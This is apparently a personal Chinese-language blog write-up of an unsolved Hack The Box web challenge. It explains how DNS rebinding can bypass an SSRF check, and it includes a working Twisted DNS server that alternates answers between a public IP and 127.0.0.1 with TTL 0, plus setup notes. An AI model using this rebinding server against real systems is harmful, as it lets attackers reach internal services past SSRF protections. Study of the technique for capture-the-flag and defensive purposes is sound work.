---
title: '[HTB]一道涉及DNS Rebinding attack的题(未做出来)'
date: 2022-01-07 21:56:33
tags: [HTB,web,刷题]
published: true
isTop: false
---
# baby CachedView (没做出来)

题目提供的Dockerfile下载cffi的时候报错,需要下载`libcairo2-dev gcc` 
暂时不打算做了.服务器之前白嫖了一个ipv6的小鸡,但是老实说自己不怎么会玩= =好像连ipv6好只能手机下一个`1.1.1.1`的vpn.......弄python环境又费好长时间.太费时间了.主要记录一下思路



![Untitled](https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/20220107_1.png)


先看一下代码,是有对应的flag路径的,并且是一个`flag.png `
仔细观察访问/flag的路由处调用的函数(自定义的装饰器) 会发现有一个or的语法
![Untitled](https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/20220107_2.png)
cache_web 内部有负责检查json传递的url是否是内网的ip.如果是,就会拒绝访问并提示

![Untitled](baby%20CachedView%20(%E6%B2%A1%E5%81%9A%E5%87%BA%E6%9D%A5)%20643fd77ac8bd473b81f7b05c5c8e09fb/Untitled%202.png)


看截图的代码(这个写的不错,学习了.之前我也用webdriver写过爬虫,没有想到这个方法)

```php
from selenium.webdriver.support.ui import WebDriverWait
WebDriverWait(driver, wait_time).until(lambda r: r.execute_script('return document.readyState') == 'complete')
```

发现即使在api的请求中去掉referrer也会在截图的代码中被识别非本地或有referrer.所以这里要使用一下DNS rebinding的方法(注意 该方法基于TTL为0的基础上,否则会返回缓存即外网地址.ssrf会失败) 

> Since domain owners have complete control of their DNS records, they can resolve their hostnames to arbitrary IP addresses. The DNS rebinding attack abuses this privilege.
> 

以下截图来自defcon的视频截图

![Untitled](https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/20220107_3.png)

最后我按着先知社区的这个帖子学来的知识去实践(谢谢大佬),[https://xz.aliyun.com/t/7495#toc-5](https://xz.aliyun.com/t/7495#toc-5) 这篇帖子也没有用 前面两个用到的”**Singularity of Origin DNS Rebinding Attack”** 工具,而是自己写了一个,我觉得对于理解也很有用.我跟着帖子以及google学习了一下twisted涉及DNS请求的部分,里面的twsited的代码应该是参考的twisted 16.5.0的document下howto的

用了帖子里的代码(改了一点)

```python
from collections import defaultdict
from twisted.internet import reactor, defer
from twisted.names import client, dns, error, server
import logging

RECORD = defaultdict(int)
SOURCE_IP = "178.128.174.129"
TARGET_IP = "127.0.0.1"
KEY_WORD = '2u1e0'

logging.basicConfig(level=logging.INFO,
                    filename="{}.log".format(KEY_WORD),
                    format='%(asctime)s - %(pathname)s[line:%(lineno)d] - %(levelname)s: %(message)s'
                    )

class DynamicResolver(object):
    def _dynamicResponseRequired(self,query):
        # print(query.name.name)
        if KEY_WORD in str(query.name.name):
            return True
        else:
            return False 

    def _doDynamicResponse(self, query):
        name = query.name.name
        if name not in RECORD or RECORD[name] % 3 == 0:
            ip = SOURCE_IP
        else:
            ip = TARGET_IP
        RECORD[name] += 1
        
        logging.info("\t[-] {}({}) ===> {}".format(name,RECORD[name],ip))
        answer = dns.RRHeader(
            name = name,
            type = dns.A,
            cls = dns.IN,
            ttl = 0, 
            payload = dns.Record_A(address=ip,ttl=0)
        )
        answers = [answer]
        authority = []
        additional = []
        return answers, authority, additional
    
    def query(self,query,timeout=None):
        if self._dynamicResponseRequired(query):
            return defer.succeed(self._doDynamicResponse(query))
        else:
            
            return defer.fail(error.DomainError())
    

def main():
    factory = server.DNSServerFactory(
        clients = [DynamicResolver(),client.Resolver(resolv='/etc/resolv.conf')]
    )
    protocol = dns.DNSDatagramProtocol(controller=factory)
    reactor.listenUDP(53,protocol)
    reactor.run()

if __name__ == '__main__':
    raise SystemExit(main())
```

一个shell脚本进行测试:

```sh
#!/bin/sh
for ((i=0; i<10; i++));
do
	dig @8.8.8.8 2u1e0.xyz
done
```

还要修改 `/etc/resolv.conf`

同时,在自己购买的域名(刚买的)上进行配置:

![Untitled](https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/20220107_4.png)

但是还需要加一条NS记录,填自己的的DNS服务器域名........





## Referer

- [https://www.youtube.com/watch?v=y9-0lICNjOQ&list=PLB0iNDIOY78Yno8UgY1j_2kKlrTxZticw](https://www.youtube.com/watch?v=y9-0lICNjOQ&list=PLB0iNDIOY78Yno8UgY1j_2kKlrTxZticw)
- [https://xz.aliyun.com/t/7495#toc-5](https://xz.aliyun.com/t/7495#toc-5)
- [https://twistedmatrix.com/documents/16.5.0/names/howto/custom-server.html](https://twistedmatrix.com/documents/16.5.0/names/howto/custom-server.html)  学习twsited的时候用到的